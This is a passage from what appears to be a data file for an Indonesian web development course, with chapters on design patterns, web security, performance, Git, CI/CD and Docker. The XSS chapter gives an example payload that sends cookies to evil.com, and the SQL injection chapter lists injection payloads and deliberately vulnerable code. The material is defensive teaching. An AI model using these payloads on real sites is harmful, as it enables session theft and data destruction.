    codeExample: { language: "javascript", code: "// SERVERLESS FUNCTION (Vercel)\n// api/hello.js\nexport default function handler(req, res) {\n  if (req.method === 'GET') {\n    return res.json({ message: 'Hello World!' });\n  }\n  if (req.method === 'POST') {\n    const { name } = req.body;\n    return res.json({ message: `Hello ${name}!` });\n  }\n}\n\n// AWS LAMBDA\nexports.handler = async (event) => {\n  const { name } = JSON.parse(event.body);\n  return {\n    statusCode: 200,\n    body: JSON.stringify({ message: `Hello ${name}!` })\n  };\n};\n\n// Cloudflare Worker\nexport default {\n  async fetch(request) {\n    const { searchParams } = new URL(request.url);\n    const name = searchParams.get('name') || 'World';\n    return new Response(`Hello ${name}!`);\n  }\n};" },

    explainAlong: "Baris 2-10: Vercel function. Baris 12-18: AWS Lambda. Baris 20-26: Cloudflare Worker.", aiPrompt: "Jelaskan apa itu 'cold start' di serverless.", reflection: "Deploy function serverless ke Vercel/Netlify. Berapa lama response time-nya?"

  },

  {

    id: "6.5", moduleId: 6, chapterNum: "6.5", title: "Design Patterns: Pola Desain yang Terbukti", subtitle: "MVC, Singleton, Observer, Factory, dan lainnya", level: "Menengah-Lanjut",

    objectives: ["Memahami design patterns umum di web development", "Bisa mengimplementasikan MVC dan Observer"],

    analogy: { diagram: "Design Patterns = Resep Masakan:\n\nMVC = Tim Restoran (Model-View-Controller)\nSingleton = Satu Chef Khusus (1 instance)\nObserver = Newsletter (subscribe → notifikasi)\nFactory = Pabrik (bikin object sesuai pesanan)", caption: "Design patterns seperti resep masakan — solusi teruji untuk masalah umum" },

    explanation: "**Design Patterns** adalah solusi teruji untuk masalah umum dalam software design. Mereka seperti resep masakan — tidak perlu reinvent dari nol.\n\n**MVC (Model-View-Controller)**\nPisahkan aplikasi menjadi 3 bagian:\n- **Model** = Data dan logic (dapur).\n- **View** = Tampilan (piring saji).\n- **Controller** = Penghubung (pelayan).\n\n**Singleton**\nPola yang memastikan sebuah class hanya punya 1 instance.\nContoh: Database connection, logger.\n\n**Observer**\nPola publish-subscribe. Object (subject) memberi notifikasi ke banyak listener (observers).\nContoh: Event emitter, newsletter.\n\n**Factory**\nPola untuk membuat object tanpa menentukan class exact.\nContoh: Membuat berbagai jenis button.",

    codeExample: { language: "javascript", code: "// MVC PATTERN\nclass TodoModel {\n  constructor() { this.todos = []; }\n  add(todo) { this.todos.push(todo); }\n  getAll() { return this.todos; }\n}\n\nclass TodoView {\n  render(todos) {\n    return todos.map(t => `<li>${t}</li>`).join('');\n  }\n}\n\nclass TodoController {\n  constructor(model, view) {\n    this.model = model;\n    this.view = view;\n  }\n  addTodo(text) {\n    this.model.add(text);\n    return this.view.render(this.model.getAll());\n  }\n}\n\n// SINGLETON\nclass Database {\n  static instance = null;\n  static getInstance() {\n    if (!Database.instance) {\n      Database.instance = new Database();\n    }\n    return Database.instance;\n  }\n}\n\n// OBSERVER\nclass EventEmitter {\n  constructor() { this.listeners = {}; }\n  on(event, callback) {\n    if (!this.listeners[event]) this.listeners[event] = [];\n    this.listeners[event].push(callback);\n  }\n  emit(event, data) {\n    (this.listeners[event] || []).forEach(cb => cb(data));\n  }\n}" },

    explainAlong: "Baris 1-21: MVC pattern lengkap. Baris 23-31: Singleton. Baris 33-42: Observer/EventEmitter.", aiPrompt: "Jelaskan kapan menggunakan MVC vs MVVM.", reflection: "Identifikasi design pattern di codebase-mu. Ada berapa yang kamu temukan?"

  },

];



// ============================================================

// MODUL 7: Keamanan Web & Performa (7 chapters)

// ============================================================

const modul7: Chapter[] = [

  {

    id: "7.1", moduleId: 7, chapterNum: "7.1", title: "XSS: Cross-Site Scripting", subtitle: "Cara kerja serangan XSS dan cara mencegahnya", level: "Lanjut",

    objectives: ["Memahami cara kerja XSS", "Bisa mencegah XSS di aplikasi"],

    analogy: { diagram: "XSS = Penjahat Pura-pura Jadi Tamu:\n\n[Penjahat] → 'Saya bawa kue' (berisi pesan rahasia)\n[Security] → Cek kue → Tidak curiga → Izinkan masuk\n[Penjahat] → Baca semua surat di meja", caption: "XSS — attacker menyisipkan kode jahat ke website" },

    explanation: "**XSS (Cross-Site Scripting)** adalah serangan di mana attacker menyisipkan kode JavaScript jahat ke website. Ketika user lain mengunjungi website itu, kode jahat tersebut berjalan di browser mereka.\\n\\n**Cara kerja XSS:**\\n1. Attacker menemukan form yang tidak sanitize input (komentar, search, profil).\\n2. Attacker kirim input berisi `<script>alert('hacked')</script>`.\\n3.\n\nWebsite menyimpan input tersebut dan menampilkannya ke user lain.\\n4.\n\nScript berjalan di browser victim — bisa mencuri cookie, session, atau melakukan aksi atas nama user.\\n\\n**Jenis XSS:**\\n- **Stored XSS** → Script disimpan di database (paling berbahaya).\\n- **Reflected XSS** → Script ada di URL,\n\nTidak disimpan.\\n- **DOM-based XSS** → Script manipulasi DOM langsung.\\n\\n**Pencegahan:**\\n1.\n\n**Sanitize input** — Hapus atau escape karakter berbahaya.\\n2.\n\n**Content Security Policy (CSP)** — Header HTTP yang membatasi sumber script.\\n3.\n\n**HttpOnly cookie** — Cookie tidak bisa diakses JavaScript.",

    codeExample: { language: "javascript", code: "// VULNERABLE — Tidak sanitize\napp.get('/comment', (req, res) => {\n  res.send(`<div>${req.query.text}</div>`);\n});\n// Input: <script>fetch('evil.com?cookie=' + document.cookie)</script>\n\n// SECURE — Escape output\nconst escapeHtml = (text) => {\n  return text\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;');\n};\napp.get('/comment', (req, res) => {\n  res.send(`<div>${escapeHtml(req.query.text)}</div>`);\n});\n\n// Gunakan library seperti DOMPurify\nimport DOMPurify from 'dompurify';\nconst clean = DOMPurify.sanitize(dirtyHtml);\n\n// Content Security Policy\napp.use((req, res, next) => {\n  res.setHeader('Content-Security-Policy', \"script-src 'self'\");\n  next();\n});" },

    explainAlong: "Baris 1-5: Vulnerable — tidak sanitize. Baris 8-16: Secure — escape HTML. Baris 19-20: DOMPurify. Baris 23-26: CSP header.", aiPrompt: "Jelaskan bedanya stored XSS dan reflected XSS.", reflection: "Coba XSS payload di website yang vuln. Gunakan alert(1) untuk test."

  },

  {

    id: "7.2", moduleId: 7, chapterNum: "7.2", title: "CSRF: Cross-Site Request Forgery", subtitle: "Cara kerja CSRF dan proteksi dengan token", level: "Lanjut",

    objectives: ["Memahami cara kerja CSRF", "Bisa mengimplementasikan proteksi CSRF"],

    analogy: { diagram: "CSRF = Penipuan dengan Surat Palsu:\n\n[Penjahat] → Kirim surat ke bank: 'Transfer 10jt ke rekening X'\n     ↓ (dengan tanda tangan asli kamu!)\n[Bank] → 'Tanda tangan valid' → Transfer!", caption: "CSRF — attacker memaksa user melakukan aksi tidak diinginkan" },

    explanation: "**CSRF** adalah serangan di mana attacker memaksa user yang sudah login melakukan aksi tidak diinginkan di website.\\n\\n**Cara kerja CSRF:**\\n1. User login ke bank.com (cookie tersimpan).\\n2. User buka website jahat di tab lain.\\n3. Website jahat kirim form ke bank.com/transfer.\\n4.\n\nBrowser otomatis kirim cookie bank.com.\\n5. Bank.com terima request dengan cookie valid → transfer uang!\\n\\nUser tidak tahu apa-apa — transfer terjadi di background.\\n\\n**Pencegahan CSRF:**\\n1. **CSRF Token** — Token random yang harus disertakan di setiap form.\\n2. **SameSite Cookie** — Cookie hanya dikirim ke domain yang sama.\\n3.\n\n**Referer Header Check** — Cek asal request.",

    codeExample: { language: "javascript", code: "// CSRF TOKEN (Server)\nconst csrf = require('csurf');\napp.use(csrf({ cookie: true }));\n\napp.get('/form', (req, res) => {\n  res.render('form', { csrfToken: req.csrfToken() });\n});\n\n// CSRF TOKEN (Client)\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"_csrf\" value=\"<%= csrfToken %>\">\n  <input type=\"text\" name=\"amount\">\n  <button type=\"submit\">Transfer</button>\n</form>\n\n// SAMESITE COOKIE\nres.cookie('session', token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict' // atau 'lax'\n});\n\n// FETCH DENGAN CSRF TOKEN\nfetch('/api/transfer', {\n  method: 'POST',\n  headers: {\n    'X-CSRF-Token': document.querySelector('meta[name=csrf]').content\n  },\n  body: JSON.stringify({ amount: 1000 })\n});" },

    explainAlong: "Baris 2-7: CSRF middleware. Baris 10-15: Token di form. Baris 18-22: SameSite cookie. Baris 25-32: Fetch dengan CSRF token.", aiPrompt: "Jelaskan bedanya SameSite=Strict dan SameSite=Lax.", reflection: "Cek apakah website-mu punya proteksi CSRF. Lihat form — ada CSRF token?"

  },

  {

    id: "7.3", moduleId: 7, chapterNum: "7.3", title: "SQL Injection: Serangan ke Database", subtitle: "Cara kerja SQL injection dan parameterized query", level: "Lanjut",

    objectives: ["Memahami cara kerja SQL injection", "Bisa menggunakan parameterized query"],

    analogy: { diagram: "SQL Injection = Menyusupkan Pesan ke Formulir:\n\n[Form] Nama: ' OR '1'='1\n[Query] SELECT * FROM users WHERE name = '' OR '1'='1'\n[Hasil] Semua data user terbuka!", caption: "SQL injection — menyisipkan kode SQL ke input form" },

    explanation: "**SQL Injection** adalah serangan di mana attacker menyisipkan kode SQL ke input form.\n\nKalau website tidak melindungi query-nya, attacker bisa membaca, mengubah, atau menghapus seluruh database.\\n\\n**Cara kerja:**\\nInput form nama: `' OR '1'='1`\\nQuery jadi: `SELECT * FROM users WHERE name = '' OR '1'='1'`\\nKarena `'1'='1'` selalu true,\n\nSemua data user terbuka!\\n\\n**Pencegahan:**\\nGunakan **parameterized query** — jangan pernah concat string ke SQL query!",

    codeExample: { language: "javascript", code: "// VULNERABLE — String concatenation\napp.get('/user', (req, res) => {\n  const query = `SELECT * FROM users WHERE name = '${req.query.name}'`;\n  db.query(query); // BERBAHAYA!\n});\n\n// SECURE — Parameterized query\napp.get('/user', (req, res) => {\n  db.query('SELECT * FROM users WHERE name = ?', [req.query.name]);\n});\n\n// SECURE — Dengan ORM (Sequelize/Prisma)\nconst user = await User.findOne({\n  where: { name: req.query.name }\n});\n\n// SQL INJECTION PAYLOADS yang umum:\n// ' OR '1'='1' --\n// ' UNION SELECT * FROM passwords --\n// '; DROP TABLE users; --" },

    explainAlong: "Baris 1-6: Vulnerable. Baris 8-11: Secure dengan parameterized query. Baris 13-16: ORM. Baris 18-20: Payloads umum.", aiPrompt: "Jelaskan bedanya parameterized query dan stored procedures.", reflection: "Scan aplikasimu — ada query yang pakai string concatenation? Fix sekarang!"

  },

  {

    id: "7.4", moduleId: 7, chapterNum: "7.4", title: "HTTPS dan TLS/SSL: Enkripsi Komunikasi", subtitle: "Cara kerja HTTPS, TLS handshake, dan sertifikat", level: "Lanjut",

    objectives: ["Memahami cara kerja HTTPS dan enkripsi", "Bisa mengatur HTTPS di server"],

    analogy: { diagram: "HTTP = Surat Terbuka (semua bisa baca)\nHTTPS = Surat Tertutup + Gembok (hanya penerima bisa baca)\n\n[Tangan] → 📬🔒 → [Tangan]\n  (Enkripsi → Transport → Dekripsi)", caption: "HTTPS seperti surat bergembok — data terenkripsi saat transit" },

    explanation: "**HTTPS** adalah HTTP dengan enkripsi. Data yang dikirim antara browser dan server di-enkripsi sehingga tidak bisa dibaca pihak ketiga.\\n\\n**Cara kerja TLS Handshake:**\\n1. Client kirim 'Client Hello' — daftar cipher suite yang didukung.\\n2. Server kirim 'Server Hello' — cipher suite yang dipilih + sertifikat SSL.\\n3.\n\nClient verifikasi sertifikat (apakah dari CA terpercaya?).\\n4. Client dan server generate session key (enkripsi simetris).\\n5. Komunikasi selanjutnya menggunakan session key.\\n\\n**Mengapa HTTPS penting:**\\n- Mencegah eavesdropping (penyadapan).\\n- Mencegah tampering (perubahan data).\\n- Autentikasi server (apakah benar google.com?).\\n- SEO ranking factor (Google prioritaskan HTTPS).\\n\\n**Let's Encrypt** — Sertifikat SSL gratis, auto-renewal.",

    codeExample: { language: "javascript", code: "// Express dengan HTTPS\nconst https = require('https');\nconst fs = require('fs');\nconst express = require('express');\nconst app = express();\n\nconst options = {\n  key: fs.readFileSync('private-key.pem'),\n  cert: fs.readFileSync('certificate.pem')\n};\n\nhttps.createServer(options, app).listen(443);\n\n// Redirect HTTP ke HTTPS\napp.use((req, res, next) => {\n  if (!req.secure) {\n    return res.redirect(`https://${req.headers.host}${req.url}`);\n  }\n  next();\n});\n\n// HSTS Header\napp.use((req, res, next) => {\n  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');\n  next();\n});" },

    explainAlong: "Baris 2-11: HTTPS server. Baris 14-19: Redirect HTTP ke HTTPS. Baris 22-25: HSTS header.", aiPrompt: "Jelaskan bedanya enkripsi simetris dan asimetris.", reflection: "Cek apakah website-mu pakai HTTPS. Lihat sertifikatnya di browser."

  },

  {

    id: "7.5", moduleId: 7, chapterNum: "7.5", title: "Core Web Vitals: Ukur Performa Website", subtitle: "LCP, FID, CLS, dan cara mengoptimalkannya", level: "Lanjut",

    objectives: ["Memahami metrik Core Web Vitals", "Bisa mengoptimalkan performa website"],

    analogy: { diagram: "Core Web Vitals = Tes Kesehatan Website:\n\nLCP = Berapa lama konten utama muncul?\nFID = Berapa lama website merespon klik?\nCLS = Apakah layout bergerak-gerak?", caption: "Core Web Vitals seperti tes kesehatan — mengukur kualitas experience" },

    explanation: "**Core Web Vitals** adalah 3 metrik utama yang Google gunakan untuk mengukur kualitas user experience di website.\\n\\n**1.\n\nLCP (Largest Contentful Paint)**\\nBerapa lama elemen terbesar di viewport muncul.\\n- 🟢 Good: < 2.5 detik\\n- 🟡 Needs Improvement: 2.5 - 4 detik\\n- 🔴 Poor: > 4 detik\\n\\n**2.\n\nFID (First Input Delay)** → sekarang INP (Interaction to Next Paint)\\nBerapa lama website merespon interaksi pertama user (klik, tap).\\n- 🟢 Good: < 200ms\\n- 🔴 Poor: > 500ms\\n\\n**3.\n\nCLS (Cumulative Layout Shift)**\\nSeberapa banyak layout bergerak/bergeser saat halaman loading.\\n- 🟢 Good: < 0.1\\n- 🔴 Poor: > 0.25\\n\\n**Tips optimasi:**\\n- LCP: Optimasi gambar,\n\nPreload critical resource.\\n- FID/INP: Reduce JavaScript execution time.\\n- CLS: Tentukan width/height pada image dan video.",

    codeExample: { language: "javascript", code: "// MEASURE LCP\nnew PerformanceObserver((list) => {\n  const entries = list.getEntries();\n  const lastEntry = entries[entries.length - 1];\n  console.log('LCP:', lastEntry.startTime);\n}).observe({ entryTypes: ['largest-contentful-paint'] });\n\n// MEASURE CLS\nlet cls = 0;\nnew PerformanceObserver((list) => {\n  for (const entry of list.getEntries()) {\n    if (!entry.hadRecentInput) {\n      cls += entry.value;\n    }\n  }\n  console.log('CLS:', cls);\n}).observe({ entryTypes: ['layout-shift'] });\n\n// OPTIMASI LCP — Preload critical resources\n<link rel=\"preload\" as=\"image\" href=\"hero.jpg\">\n\n// OPTIMASI CLS — Tentukan dimensi\n<img src=\"photo.jpg\" width=\"800\" height=\"600\">" },

    explainAlong: "Baris 1-6: Measure LCP. Baris 8-15: Measure CLS. Baris 18: Preload. Baris 21: Tentukan dimensi gambar.", aiPrompt: "Jelaskan kenapa CLS penting untuk user experience.", reflection: "Test website-mu di PageSpeed Insights. Berapa skor LCP, INP, dan CLS-nya?"

  },

  {

    id: "7.6", moduleId: 7, chapterNum: "7.6", title: "Caching: Mempercepat Website", subtitle: "HTTP cache, CDN, dan strategi caching", level: "Lanjut",

    objectives: ["Memahami konsep caching dan jenis-jenisnya", "Bisa mengimplementasikan HTTP caching"],

    analogy: { diagram: "Caching = Menyimpan Stok di Rak Dekat:\n\nTanpa Cache:\n[Pelanggan] → 'Mau kopi' → [Gudang jauh] → 5 menit\n\nDengan Cache:\n[Pelanggan] → 'Mau kopi' → [Rak dekat] → 10 detik", caption: "Cache seperti rak dekat — data sering diakses disimpan di tempat yang lebih dekat" },

    explanation: "**Caching** adalah teknik menyimpan data di tempat yang lebih dekat/dekat pengguna sehingga akses lebih cepat.\\n\\n**Jenis Caching:**\\n\\n**1.\n\nBrowser Cache**\\nBrowser menyimpan file statis (CSS, JS, gambar) di local disk.\\nHeader: `Cache-Control: max-age=3600`\\n\\n**2.\n\nCDN (Content Delivery Network)**\\nServer di seluruh dunia yang menyimpan copy file statis.\\nUser di Jakarta → request ke server CDN di Singapura (bukan US).\\n\\n**3.\n\nServer-side Cache**\\n- Redis: Cache hasil query database.\\n- Memcached: Cache object di memory.\\n\\n**4.\n\nDatabase Cache**\\nQuery cache bawaan database.\\n\\n**Strategi Caching:**\\n- **Cache-First** → Cek cache dulu,\n\nKalau tidak ada baru ke server.\\n- **Stale-While-Revalidate** → Tampilkan cache, lalu update di background.\\n- **Cache Invalidation** → Hapus cache saat data berubah (paling sulit!).",

    codeExample: { language: "javascript", code: "// HTTP CACHE HEADER\napp.use((req, res, next) => {\n  res.setHeader('Cache-Control', 'public, max-age=3600');\n  next();\n});\n\n// REDIS CACHE\nconst redis = require('redis');\nconst client = redis.createClient();\n\nconst getData = async (key) => {\n  // Cek cache dulu\n  const cached = await client.get(key);\n  if (cached) return JSON.parse(cached);\n  \n  // Kalau tidak ada, ambil dari DB\n  const data = await db.query(`SELECT * FROM products WHERE id = ?`, [key]);\n  \n  // Simpan ke cache (expire 1 jam)\n  await client.setEx(key, 3600, JSON.stringify(data));\n  return data;\n};\n\n// CDN (Cloudflare/AWS CloudFront)\n// Cukup upload file ke CDN, mereka handle distribusi global\n\n// SERVICE WORKER — Cache di browser\nself.addEventListener('fetch', (event) => {\n  event.respondWith(\n    caches.match(event.request).then((response) => {\n      return response || fetch(event.request);\n    })\n  );\n});" },

    explainAlong: "Baris 2-5: HTTP cache header. Baris 8-20: Redis cache dengan getEx. Baris 26-31: Service Worker cache.", aiPrompt: "Jelaskan kenapa cache invalidation disebut salah satu hal tersulit di CS.", reflection: "Analisis website-mu. File apa yang bisa di-cache? Berapa lama?"

  },

  {

    id: "7.7", moduleId: 7, chapterNum: "7.7", title: "Optimasi Bundle: Kecilkan JavaScript", subtitle: "Code splitting, tree shaking, dan lazy loading", level: "Lanjut",

    objectives: ["Memahami cara mengoptimasi JavaScript bundle", "Bisa mengimplementasikan code splitting dan lazy loading"],

    analogy: { diagram: "Bundle = Koper Perjalanan:\n\nTanpa Optimasi:\n[Koper besar] → Semua pakaian (musim panas + dingin + hujan)\n\nDengan Optimasi:\n[Koper kecil] → Pakaian yang perlu saja\n[Sisa] → Kirim nanti kalau dibutuhkan", caption: "Optimasi bundle seperti packing — bawa hanya yang perlu" },

    explanation: "**JavaScript Bundle** adalah file JS hasil compile semua kode aplikasi. Semakin besar bundle, semakin lambat website loading-nya.\\n\\n**Teknik Optimasi:**\\n\\n**1. Code Splitting**\\nPecah bundle menjadi chunk yang lebih kecil.\\nUser hanya download kode untuk halaman yang dikunjungi.\\n\\n**2. Tree Shaking**\\nHapus kode yang tidak pernah dipakai (dead code elimination).\\nVite dan Webpack melakukan ini otomatis.\\n\\n**3.\n\nLazy Loading**\\nTunda download komponen/resource sampai dibutuhkan.\\n\\n**4. Minification**\\nHapus whitespace, rename variable jadi 1 huruf.\\n\\n**5. Gzip/Brotli Compression**\\nKompres file di server sebelum dikirim ke browser.",

    codeExample: { language: "javascript", code: "// CODE SPLITTING — React.lazy\nimport { lazy, Suspense } from 'react';\n\nconst Dashboard = lazy(() => import('./Dashboard'));\nconst Reports = lazy(() => import('./Reports'));\n\nfunction App() {\n  return (\n    <Suspense fallback={<Loading />}>\n      <Routes>\n        <Route path=\"/dashboard\" element={<Dashboard />} />\n        <Route path=\"/reports\" element={<Reports />} />\n      </Routes>\n    </Suspense>\n  );\n}\n\n// DYNAMIC IMPORT\nconst loadChartLibrary = async () => {\n  const { Chart } = await import('./heavy-chart-library');\n  return new Chart();\n};\n\n// WEBPACK/VITE — Manual split\n// vite.config.js\nexport default {\n  build: {\n    rollupOptions: {\n      output: {\n        manualChunks: {\n          vendor: ['react', 'react-dom'],\n          ui: ['@mui/material', '@mui/icons-material']\n        }\n      }\n    }\n  }\n};\n\n// ANALYZE BUNDLE\nnpx vite-bundle-visualizer" },

    explainAlong: "Baris 2-14: React.lazy + Suspense. Baris 16-19: Dynamic import. Baris 22-33: Manual chunks di Vite.", aiPrompt: "Jelaskan bedanya code splitting dan lazy loading.", reflection: "Analyze bundle-mu. Paling besar dari library apa? Bisa di-split?"

  },

];



// ============================================================

// MODUL 8: DevOps, Deployment & Testing (6 chapters)

// ============================================================

const modul8: Chapter[] = [

  {

    id: "8.1", moduleId: 8, chapterNum: "8.1", title: "Git: Manajemen Kode dengan Version Control", subtitle: "Branch, merge, pull request, dan workflow", level: "Lanjut",

    objectives: ["Memahami konsep Git dan version control", "Bisa menggunakan Git untuk kolaborasi"],

    analogy: { diagram: "Git = Mesin Waktu untuk Kode:\n\n[Main] → Commit A → Commit B → Commit C\n            ↓\n         [Feature] → Commit D → Commit E\n                        ↓\n                      [Merge] → Gabung ke Main", caption: "Git seperti mesin waktu — bisa kembali ke versi sebelumnya" },

    explanation: "**Git** adalah version control system yang memungkinkan kamu melacak perubahan kode, kembali ke versi sebelumnya,\n\nDan berkolaborasi dengan tim.\\n\\n**Konsep Dasar Git:**\\n- **Repository** → Folder proyek yang dilacak Git.\\n- **Commit** → Snapshot kode pada titik waktu tertentu.\\n- **Branch** → Jalur pengembangan terpisah.\\n- **Merge** → Menggabungkan branch ke branch lain.\\n- **Pull Request** → Meminta review sebelum merge.\\n\\n**Workflow Dasar:**\\n1.\n\n`git init` → Inisialisasi repository.\\n2.\n\n`git add .` → Stage perubahan.\\n3.\n\n`git commit -m 'pesan'` → Simpan commit.\\n4.\n\n`git push` → Kirim ke remote repository.\\n5. `git pull` → Ambil perubahan terbaru.\\n6. `git checkout -b feature` → Buat branch baru.",

    codeExample: { language: "bash", code: "# INISIALISASI\ngit init\ngit remote add origin https://github.com/user/repo.git\n\n# WORKFLOW HARIAN\ngit pull origin main          # Ambil update terbaru\ngit checkout -b feature/login # Buat branch baru\n# ... coding ...\ngit add .                     # Stage semua perubahan\ngit commit -m \"feat: add login form\"\ngit push -u origin feature/login\n\n# MERGE\ngit checkout main\ngit merge feature/login\ngit push\n\n# LIHAT HISTORY\ngit log --oneline --graph\n\n# UNDO\ngit checkout -- .             # Undo semua perubahan\ngit reset --soft HEAD~1       # Undo commit terakhir\ngit revert HEAD               # Buat commit pembalik" },

    explainAlong: "Baris 2-3: Init. Baris 6-11: Workflow harian. Baris 14-16: Merge. Baris 19: History. Baris 22-24: Undo.", aiPrompt: "Jelaskan bedanya git merge dan git rebase.", reflection: "Buat repo Git untuk proyekmu. Practice branching dan merging."

  },

  {

    id: "8.2", moduleId: 8, chapterNum: "8.2", title: "CI/CD: Pipeline Otomatis", subtitle: "GitHub Actions, GitLab CI, dan otomasi deployment", level: "Lanjut",

    objectives: ["Memahami konsep CI/CD", "Bisa membuat pipeline CI/CD sederhana"],

    analogy: { diagram: "CI/CD = Pabrik Otomatis:\n\n[Push Code] → [Test Otomatis] → [Build] → [Deploy]\n     ↓              ↓               ↓         ↓\n   Developer    Robot QA      Compiler   Publish live", caption: "CI/CD seperti pabrik otomatis — test, build, deploy berjalan sendiri" },

    explanation: "**CI/CD** = Continuous Integration / Continuous Deployment.\\n\\n**CI (Continuous Integration)** → Setiap push ke repo, otomatis di-test.\\n**CD (Continuous Deployment)** → Kalau test lulus,\n\nOtomatis di-deploy.\\n\\n**Analoginya kayak pabrik otomatis:**\\nPush code → Robot QA test → Compiler build → Publish ke live.\n\nSemua berjalan otomatis!\\n\\n**GitHub Actions Workflow:**\\n1.\n\nTrigger: push ke branch main.\\n2.\n\nTest: Jalankan unit test.\\n3.\n\nBuild: Build aplikasi.\\n4. Deploy: Deploy ke server/Vercel.",

    codeExample: { language: "yaml", code: "# .github/workflows/deploy.yml\nname: Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n      - run: npm ci\n      - run: npm test\n      - run: npm run build\n\n  deploy:\n    needs: test\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n      - run: npm ci\n      - run: npm run build\n      - name: Deploy to Vercel\n        run: npx vercel --prod --token=${{ secrets.VERCEL_TOKEN }}" },

    explainAlong: "Baris 4-5: Trigger. Baris 7-15: Job test. Baris 17-27: Job deploy (butuh test berhasil).", aiPrompt: "Jelaskan bedanya CI dan CD.", reflection: "Buat GitHub Actions workflow untuk proyekmu. Coba push dan lihat pipeline-nya."

  },

  {

    id: "8.3", moduleId: 8, chapterNum: "8.3", title: "Docker: Kontainerisasi Aplikasi", subtitle: "Dockerfile, image, container, dan docker-compose", level: "Lanjut",

    objectives: ["Memahami konsep containerization", "Bisa membuat Dockerfile dan docker-compose"],

    analogy: { diagram: "Docker = Kontainer Standar:\n\nSebelum Docker:\n[App A] butuh Node 14, [App B] butuh Node 18\n→ Konflik di satu server!\n\nDengan Docker:\n[Container A: Node 14 + App A]\n[Container B: Node 18 + App B]\n→ Isolasi, tidak konflik!", caption: "Docker seperti kontainer — aplikasi terisolasi dengan dependensinya" },

    explanation: "**Docker** adalah platform untuk mengemas aplikasi beserta semua dependensinya ke dalam **container** yang terisolasi.\n\n**Konsep Docker:**\n- **Dockerfile** → Resep untuk membuat image.\n- **Image** → Template aplikasi yang siap dijalankan.\n- **Container** → Instance running dari image.\n\n**Kenapa Docker?**\n- **Consistency** → 'Works on my machine' tidak lagi jadi masalah.\n- **Isolation** → Setiap app terisolasi dengan dependensinya.\n- **Portability** → Jalankan di mana saja (lokal, server, cloud).\n\n**Docker Compose** → Jalankan multi-container (app + database + redis) dengan 1 file.",

    codeExample: { language: "dockerfile", code: "# Dockerfile\nFROM node:20-alpine\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm ci --only=production\n\nCOPY . .\n\nEXPOSE 3000\n\nCMD [\"node\", \"server.js\"]\n\n# docker-compose.yml\nversion: '3'\nservices:\n  app:\n    build: .\n    ports:\n      - \"3000:3000\"\n    environment:\n      - DATABASE_URL=postgres://db:5432/myapp\n    depends_on:\n      - db\n      - redis\n  \n  db:\n    image: postgres:15\n    environment:\n      POSTGRES_DB: myapp\n      POSTGRES_PASSWORD: secret\n  \n  redis:\n    image: redis:alpine" },

    explainAlong: "Baris 1-11: Dockerfile. Baris 14-33: Docker Compose dengan app, db, dan redis.", aiPrompt: "Jelaskan bedanya Docker container dan VM.", reflection: "Dockerize aplikasimu. Coba jalankan dengan docker-compose."

  },

  {

    id: "8.4", moduleId: 8, chapterNum: "8.4", title: "Cloud Deployment: Deploy ke Internet", subtitle: "Vercel, Netlify, AWS, dan platform cloud", level: "Lanjut",

    objectives: ["Memahami berbagai platform deployment", "Bisa deploy aplikasi ke cloud"],

    analogy: { diagram: "Deployment = Buka Toko:\n\nVercel/Netlify = Tenant Mall (Mudah, siap pakai)\nAWS/Azure/GCP = Sewa Gedung (Fleksibel, butuh setup)\nVPS = Kontrakan (Kontrol penuh, perlu perawatan)", caption: "Pilih platform sesuai kebutuhan — dari yang simple sampai yang fleksibel" },

    explanation: "**Deployment** adalah proses membuat aplikasi kamu bisa diakses dari internet.\n\nAda banyak platform dengan tingkat kemudahan dan fleksibilitas berbeda.\\n\\n**Platform Frontend (Simple):**\\n- **Vercel** → Terbaik untuk Next.js, deploy otomatis dari Git.\\n- **Netlify** → Terbaik untuk static site, form handling built-in.\\n\\n**Platform Full-Stack:**\\n- **Railway/Render** → Deploy backend + database dengan mudah.\\n- **Heroku** → Dulu populer,\n\nSekarang berbayar.\\n\\n**Cloud Provider (Fleksibel):**\\n- **AWS** → Paling populer, ribuan service.\\n- **Google Cloud Platform** → Integrasi bagus dengan Google service.\\n- **Azure** → Terbaik untuk enterprise Microsoft.",

    codeExample: { language: "bash", code: "# VERCEL DEPLOYMENT\nnpm i -g vercel\nvercel --prod\n\n# NETLIFY DEPLOYMENT\nnpm i -g netlify-cli\nnetlify deploy --prod --dir=dist\n\n# DOCKER DEPLOY TO VPS\n# Build image\ndocker build -t myapp:latest .\n\n# Save and transfer\ndocker save myapp:latest | gzip > myapp.tar.gz\nscp myapp.tar.gz user@server:/home/user/\n\n# On server\ndocker load < myapp.tar.gz\ndocker run -d -p 3000:3000 --name myapp myapp:latest" },

    explainAlong: "Baris 2-3: Vercel. Baris 6-7: Netlify. Baris 10-19: Docker deploy ke VPS.", aiPrompt: "Jelaskan bedanya PaaS (Platform as a Service) dan IaaS (Infrastructure as a Service).", reflection: "Deploy aplikasimu ke Vercel/Netlify. Berapa lama prosesnya?"

  },

  {

    id: "8.5", moduleId: 8, chapterNum: "8.5", title: "Testing: Menjamin Kualitas Kode", subtitle: "Unit test, integration test, dan E2E test", level: "Lanjut",

    objectives: ["Memahami jenis-jenis testing", "Bisa menulis unit test dengan Jest/Vitest"],

    analogy: { diagram: "Testing = Pemeriksaan Kesehatan:\n\nUnit Test = Cek Darah (1 komponen)\nIntegration Test = Cek Jantung (beberapa komponen bersama)\nE2E Test = Medical Checkup Lengkap (seluruh sistem)", caption: "Testing seperti medical checkup — memastikan semua berfungsi normal" },

